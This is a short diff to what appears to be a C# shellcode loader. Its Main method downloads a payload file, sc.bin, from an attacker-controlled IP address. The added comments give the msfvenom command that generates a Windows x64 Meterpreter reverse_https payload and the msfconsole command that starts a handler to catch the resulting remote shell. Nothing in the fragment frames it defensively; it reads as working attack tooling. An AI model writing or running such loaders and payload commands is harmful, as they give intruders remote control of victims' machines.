@@ -137,7 +137,8 @@ class Program
     static void Main()
     {
         SystemDiagnosticsCheck();
-
+        // msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST eth0; set LPORT 443; set EXITONSESSION false; set EXITFUNC thread; exploit -j'
+        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 -f raw EXITFUNC=thread -o sc.bin
         string url = "http://192.168.x.x/sc.bin"; // change to you IP
         byte[] payload = GetPayloadFromUrl(url);
 
